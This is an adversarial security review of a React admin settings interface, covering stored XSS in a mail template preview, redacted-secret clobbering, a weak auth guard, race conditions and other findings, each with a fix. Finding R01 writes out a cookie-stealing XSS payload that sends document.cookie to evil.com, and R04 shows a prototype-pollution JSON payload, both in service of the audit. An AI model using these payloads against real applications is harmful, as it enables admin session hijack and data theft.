# Security Review — ui-react Settings Landing — Adversarial Review

**Date**: 2026-04-12
**Scope**: `/ui-react/src/routes/settings*.tsx`, `/ui-react/src/components/SectionCard.tsx`
**Reviewer**: internal security pass
**Methodology**: Static analysis, three-lens (crypto, systems, application)

---

## Findings

### [CRITICAL] R01: Stored XSS via Mail Template Preview — `dangerouslySetInnerHTML` Without Sanitization

**Description**: `settings.mail.tsx:148` renders the mail template body directly into the DOM via `dangerouslySetInnerHTML={{ __html: previewHtml }}`. The `previewHtml` value is derived from the `body` form field with only placeholder substitution (`.replace(/{APP_NAME}/g, ...)`) — no HTML sanitization, no sandboxing, no iframe isolation.

**Location**: `src/routes/settings.mail.tsx:148`

**Attack Complexity**: Low — requires admin access (which this page already presumes), but the attack persists: a compromised or malicious co-admin edits the template body to include `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` or `<script>...</script>`. Every other admin who views the mail template preview in the settings page executes the payload in their browser context. The template body is persisted server-side via `base.collections.update()`, making this stored XSS.

**Exploitability**:
```
Attack chain:
1. Admin A saves verification template body:
   <p>Hi {APP_NAME}</p><img src=x onerror="fetch('https://evil.com/'+document.cookie)">
2. Admin B opens Settings > Mail templates
3. previewHtml renders the body via dangerouslySetInnerHTML
4. <img> onerror fires, exfiltrates Admin B's session cookie
5. Attacker uses stolen cookie to impersonate Admin B
```

**Impact**: Full admin session hijack. Attacker gains superuser access to the Base instance — can export all data, create backdoor superuser accounts, modify auth providers, restore malicious backups.

**Detectability**: No CSP violation logged (no CSP on the preview container). No server-side sanitization. The payload is stored in a legitimate collection field.

**Fix Hint**: Replace the bare `<div dangerouslySetInnerHTML>` with an `<iframe sandbox="" srcdoc={previewHtml}>` that has no `allow-scripts`, `allow-same-origin`, or `allow-top-navigation`. This is the only correct approach — DOMPurify would strip legitimate template HTML that admins need to preview.

---

### [HIGH] R02: Redacted Secret Re-Save Clobber — SMTP Password, S3 Secret, OAuth2 Client Secret

**Description**: Three settings forms populate their initial values from the server response, which returns redacted secrets (e.g., `smtp.password: "***"`). The forms use `react-hook-form` `values` prop, which resets the form to server data on every fetch. If an admin opens SMTP settings, changes the host, and clicks Save without re-entering the password, the form submits `password: "***"` back to the server. Depending on the server's handling, this either:
- (a) Overwrites the real SMTP password with the literal string `"***"`, breaking email delivery, or
- (b) The server special-cases `"***"` and ignores it (PocketBase does this for some fields, but not consistently).

Same pattern in `settings.backups.tsx` (S3 `secret` field at line 67) and `settings.auth.tsx` (`clientSecret` at line 148).

**Location**: `settings.smtp.tsx:71`, `settings.backups.tsx:67`, `settings.auth.tsx:148`

**Attack Complexity**: Low — any admin saving any form without re-typing the secret triggers it.

**Exploitability**:
```
1. Admin opens Settings > SMTP
2. Server returns smtp.password: "***" (redacted)
3. Form initializes password field to "***"
4. Admin changes host to "smtp.newprovider.com", clicks Save
5. PUT /api/settings sends { smtp: { password: "***", host: "smtp.newprovider.com", ... } }
6. If server stores "***" literally → SMTP auth breaks, no emails sent
7. Password reset, email verification, OTP all fail silently
```

**Impact**: Service disruption (email delivery fails). In the S3 case, backup uploads fail silently — admin believes backups are running but they are not, creating a false sense of data safety. For OAuth2 `clientSecret`, social login breaks.

**Detectability**: No immediate error. The save succeeds. Failure only surfaces when the next email/backup/OAuth flow runs.

**Fix Hint**: Track whether the user actually modified the secret field. If the field value equals the redacted placeholder, omit it from the save payload. Use a sentinel comparison: `if (data.password === '***') delete payload.smtp.password`.

---

### [HIGH] R03: Auth Gate Checks Token Existence, Not Validity or Role

**Description**: The `beforeLoad` guard at `settings.tsx:51-53` checks `if (!base.authStore.token)` — it verifies that a token string exists, but does not verify:
1. The token is not expired (`authStore.isValid` checks expiry)
2. The token belongs to a superuser (`authStore.isSuperuser`)

This means a regular auth-collection user who somehow has a token in `authStore` (e.g., via the login page for a user-facing collection) can navigate to `/settings/*` and the `beforeLoad` guard passes. The API calls will fail with 403, but the entire settings UI renders, leaking the settings page structure, nav items, and form labels. More critically, if there is ever a server-side bug that accepts non-superuser tokens for settings endpoints, the FE provides no defense-in-depth.

**Location**: `src/routes/settings.tsx:51-53`

**Attack Complexity**: Medium — requires a non-superuser to have a token in the auth store.

**Exploitability**:
```
1. User authenticates via a regular auth collection (e.g., "users")
2. base.authStore.token is set (non-superuser JWT)
3. User navigates to /settings/superusers
4. beforeLoad passes (token is truthy)
5. Settings layout renders with all nav items visible
6. API calls fail, but UI is exposed
```

**Impact**: Information disclosure (settings page structure). Violation of defense-in-depth: if the server-side check has a gap, the FE is the last line — and it's not holding.

**Fix Hint**: Change guard to `if (!base.authStore.isValid || !base.authStore.isSuperuser) throw redirect({ to: '/login' })`.

---

### [MEDIUM] R04: Import Collections — No `__proto__` / Prototype Pollution Guard

**Description**: `settings.data.tsx:94` uses `JSON.parse(text)` on user-uploaded JSON. The parsed result is stored in state as `importParsed` and later passed to `base.collections.import(importParsed)`. While `JSON.parse` itself does not pollute prototypes, the parsed objects may contain `__proto__` or `constructor` keys. If any downstream code (in the PocketBase SDK, in React's reconciler during diffing, or in future refactors that use spread/Object.assign) iterates these objects, prototype pollution can occur.

The `base.collections.import()` SDK method sends these objects directly to the server. If the server-side Go code deserializes the JSON into a map and uses it in template rendering or query construction, the `__proto__` key becomes a payload.

**Location**: `src/routes/settings.data.tsx:91-105`

**Attack Complexity**: Medium — requires crafting a JSON payload and uploading it via the import form.

**Exploitability**:
```json
[{
  "id": "malicious",
  "name": "exploit",
  "__proto__": { "isAdmin": true },
  "constructor": { "prototype": { "isAdmin": true } }
}]
```
The immediate risk is low in the current code path (no spread/merge after parse). The deferred risk is high: any future refactor that does `const merged = { ...defaults, ...parsed }` inherits the pollution.

**Impact**: Currently limited to potential server-side issues if the Go backend does not strip `__proto__` keys. Future refactors on the FE could elevate to full prototype pollution (arbitrary property injection on Object.prototype).

**Fix Hint**: After `JSON.parse`, recursively strip `__proto__` and `constructor` keys from the parsed tree before storing in state.

---

### [MEDIUM] R05: Token Secret Regeneration — Client-Side Secret Generation, No Server-Side Invalidation Guarantee

**Description**: `settings.tokens.tsx:58-68` generates the new token secret client-side using `crypto.getRandomValues()` and sends it to the server via `base.collections.update()`. Two issues:

1. **Client-side generation**: The secret is generated in the browser and transmitted to the server. If the network is intercepted (even briefly, before TLS handshake), the secret is exposed in-flight. The server should generate secrets server-side and return only a confirmation.

2. **No invalidation feedback**: After regeneration, the server updates the secret, but the UI shows "Secret regenerated" without confirming that all outstanding tokens of that type were actually invalidated. If the server caches old secrets or has a grace period, tokens signed with the old secret may still be valid.

**Location**: `src/routes/settings.tokens.tsx:58-68`

**Attack Complexity**: Medium — the client-side generation is always active; the invalidation gap depends on server behavior.

**Impact**: If the old secret is not immediately invalidated server-side, an attacker with a valid token continues to have access after the admin believes they revoked it. The client-side secret generation is architecturally wrong but mitigated by HTTPS in practice.

**Fix Hint**: Do not generate secrets client-side. Call a dedicated server endpoint (e.g., `POST /api/collections/:id/tokens/:type/regenerate`) that generates the secret server-side and returns only a success flag.

---

### [MEDIUM] R06: Backup Restore — No Concurrency Guard, No Mutual Exclusion

**Description**: `settings.backups.tsx:94-97` calls `base.backups.restore(key)` with only a UI-level confirmation (the `restoreTarget` state variable). If two admins open the backups page simultaneously and both click Restore on different backups, both requests are sent concurrently. The server must handle this, but the UI provides no feedback that a restore is already in progress, no lock indicator, and no way to cancel.

Additionally, the restore button does not disable globally when any restore is pending — only the specific confirmation flow tracks state. Admin A's restore could silently clobber Admin B's restore.

**Location**: `src/routes/settings.backups.tsx:94-97, 164-179`

**Attack Complexity**: Low — two admins on the same page.

**Impact**: Data corruption if two restores execute concurrently. At minimum, unpredictable database state. At maximum, partial restore leaving the database in an inconsistent state.

**Fix Hint**: Before initiating restore, poll for active restore operations. Disable all restore buttons while any restore is pending. Show a global "restore in progress" banner.

---

### [MEDIUM] R07: OAuth2 Provider Save — Read-Modify-Write Race Condition

**Description**: `settings.auth.tsx:157-192` implements a read-modify-write pattern:
1. Fetch current collection (`base.collections.getOne(collectionId)`)
2. Find the provider in the array
3. Spread-merge the update
4. Write back the entire `oauth2` object

If Admin A and Admin B both edit different providers on the same collection simultaneously, the last write wins and silently discards the first write. There is no optimistic concurrency control (no ETag, no version field, no CAS).

**Location**: `src/routes/settings.auth.tsx:157-192`

**Attack Complexity**: Low — two admins editing auth providers.

**Exploitability**:
```
T0: Admin A opens auth page, fetches collection (providers: [google])
T1: Admin B opens auth page, fetches collection (providers: [google])
T2: Admin A saves github provider → write: providers: [google, github]
T3: Admin B saves discord provider → read at T1 had only [google],
    so write: providers: [google, discord]
    → github config from T2 is silently lost
```

**Impact**: Silent configuration loss. Google OAuth could stop working without any admin noticing.

**Fix Hint**: Re-fetch the collection immediately before write (inside the mutation), not at form open time. Or use server-side PATCH semantics that merge rather than replace.

---

### [LOW] R08: Superuser Password — No `confirm === password` Validation on Client

**Description**: Both the create and change-password forms in `settings.superusers.tsx` accept `password` and `passwordConfirm` with `minLength: 10` validation, but do not validate that the two fields match on the client side. The server will reject mismatched passwords, but the user gets a generic API error instead of inline form feedback.

Additionally, there is no complexity requirement (uppercase, digit, special char) — only `minLength: 10`. The server may enforce more, but the FE does not mirror it, creating a confusing UX where the FE accepts the input but the server rejects it.

**Location**: `src/routes/settings.superusers.tsx:116-120, 153-158`

**Attack Complexity**: N/A — UX issue, not a direct vulnerability.

**Impact**: Poor UX. Admin submits mismatched passwords, gets a server error, has to guess what went wrong. No security impact beyond the server being the sole enforcement point.

**Fix Hint**: Add `validate` to `passwordConfirm` that checks `value === watch('password')`.

---

### [LOW] R09: Rate Limit Label — No Client-Side Validation for Empty/Duplicate/Overlength Labels

**Description**: `settings.rate-limits.tsx:69-74` allows any string in the `label` field including empty string, Unicode RTL override characters (U+202E), extremely long strings, and duplicates. The server may validate these, but the FE provides no guard.

Empty labels could create rate limit rules that match nothing (silent no-op). Duplicate labels could create conflicting rules where only one takes effect (order-dependent). RTL override characters in the label could corrupt the admin UI display.

**Location**: `src/routes/settings.rate-limits.tsx:119-122`

**Attack Complexity**: Low — type garbage into the label field.

**Impact**: Configuration confusion. An admin could believe rate limiting is active when it is not (empty label matches nothing). RTL characters could cause visual spoofing in the admin panel.

**Fix Hint**: Trim whitespace, reject empty labels, reject duplicate labels within the same rule set, limit length to 256 chars, strip Unicode control characters.

---

### [LOW] R10: Log Settings — Duplicate Value in `logLevels` Array

**Description**: `settings.logs.tsx:15-20` defines the log level selector with a duplicate entry: both "Default" (index 0) and "INFO (0)" (index 2) have `value: 0`. This means the `<select>` renders two options that submit the same value. The user cannot distinguish between selecting "Default" and "INFO" — both send `0`. This is a data integrity issue, not a security issue, but it indicates sloppy implementation that could mask bugs.

**Location**: `src/routes/settings.logs.tsx:15-20`

**Attack Complexity**: N/A

**Impact**: Cosmetic. Confusing UX.

**Fix Hint**: Remove the duplicate. If "Default" means "use server default", use a sentinel value like `-1` and handle it in the save mutation.

---

### [INFO] R11: Test Email — `toEmail` Input Accepts Only Browser `type="email"` Validation

**Description**: `settings.smtp.tsx:200` uses `type="email"` on the test email input. Browser email validation is permissive (accepts `user@localhost`, `a@b`, etc.). The concern about SMTP header injection via the email field is mitigated: the value is sent to `base.settings.testEmail()` which passes it as a JSON body field, not directly into SMTP headers. The server is responsible for SMTP header injection prevention. The FE risk here is minimal.

**Location**: `src/routes/settings.smtp.tsx:199-200`

**Impact**: None on the FE. Server must validate.

---

### [INFO] R12: SectionCard — Clean, No innerHTML

**Description**: `SectionCard.tsx` renders `title` and `description` via React's normal JSX interpolation (`{ title }`, `{ description }`), which auto-escapes. No `dangerouslySetInnerHTML`, no `innerHTML`. This component is safe.

**Location**: `src/components/SectionCard.tsx`

**Impact**: None. This is a positive finding.

---

### [INFO] R13: No localStorage/sessionStorage Use in Settings

**Description**: Grep confirms zero uses of `localStorage` or `sessionStorage` anywhere in the settings routes or SectionCard. Secrets are not persisted to browser storage. The PocketBase SDK's `authStore` uses its own storage mechanism (cookie-based by default), which is separate from the settings data flow.

**Impact**: None. This is a positive finding.

---

### [INFO] R14: Child Routes Inherit Parent `beforeLoad`

**Description**: TanStack Router's file-based routing ensures that `settings.smtp.tsx`, `settings.backups.tsx`, etc. are child routes of `settings.tsx`. The parent's `beforeLoad` runs before any child route loads. This means all settings subroutes are gated — none can be accessed without passing the parent's auth check.

However, the parent check is weak (R03), so this inheritance only propagates the weak check.

**Impact**: Positive architecture, but undermined by R03.

---

## Blue Handoff

### What Blue got right
- **SectionCard is clean**: React JSX auto-escaping, no innerHTML. Solid.
- **No localStorage/sessionStorage for secrets**: Correct. No browser persistence of sensitive data.
- **Child route inheritance**: TanStack Router's parent `beforeLoad` correctly gates all children. Architecture is sound.
- **Password `minLength: 10`**: Present on all password fields. Not sufficient alone, but it is there.
- **Test email uses `type="email"`**: Browser validation present. Server-side is the real guard and that is not FE's job.
- **Backup restore has two-step confirmation**: The `restoreTarget` state pattern is a good UX guard against accidental restore.

### What Blue missed
- **The XSS in mail preview is the dominant finding**. Blue flagged it as a vector but the implementation has zero mitigation — no iframe, no sandbox, no DOMPurify, no CSP. This is a live stored XSS in the admin panel.
- **The redacted secret clobber pattern** appears in three separate files with the same bug. Blue noted it but the implementation does not handle it.
- **The auth gate weakness** (`token` truthy vs `isValid && isSuperuser`) was not in Blue's threat model.
- **Client-side secret generation** in `settings.tokens.tsx` is architecturally wrong and was not flagged.

### Fix priority for Blue
1. **R01 (CRITICAL)**: Replace `dangerouslySetInnerHTML` div with sandboxed iframe in `settings.mail.tsx`
2. **R02 (HIGH)**: Add sentinel detection for redacted secrets in `settings.smtp.tsx`, `settings.backups.tsx`, `settings.auth.tsx`
3. **R03 (HIGH)**: Strengthen `beforeLoad` guard to check `isValid && isSuperuser`
4. **R05 (MEDIUM)**: Move secret generation server-side in `settings.tokens.tsx`
5. **R04 (MEDIUM)**: Add `__proto__` stripping to import parser in `settings.data.tsx`
6. **R07 (MEDIUM)**: Re-fetch collection inside mutation in `settings.auth.tsx`
7. **R06 (MEDIUM)**: Add global restore-in-progress guard in `settings.backups.tsx`
8. **R08 (LOW)**: Add password match validation in `settings.superusers.tsx`
9. **R09 (LOW)**: Add label validation in `settings.rate-limits.tsx`
10. **R10 (LOW)**: Fix duplicate log level value in `settings.logs.tsx`

### Re-review scope
After Blue fixes R01, R02, R03: re-review `settings.mail.tsx` (verify iframe sandbox attributes), all three secret-handling forms (verify sentinel logic), and `settings.tsx` (verify auth guard).

---

RED COMPLETE. Findings ready for Blue.
Total: 1 critical, 2 high, 4 medium, 3 low, 4 info
Top 3 for Blue to fix:
1. R01: Stored XSS via dangerouslySetInnerHTML in mail template preview
2. R02: Redacted secret re-save clobber in SMTP/S3/OAuth2 forms
3. R03: Auth gate checks token existence, not validity or superuser role
Re-review needed: yes — R01 iframe sandbox, R02 sentinel logic, R03 auth guard
Recommendation: fix-then-ship
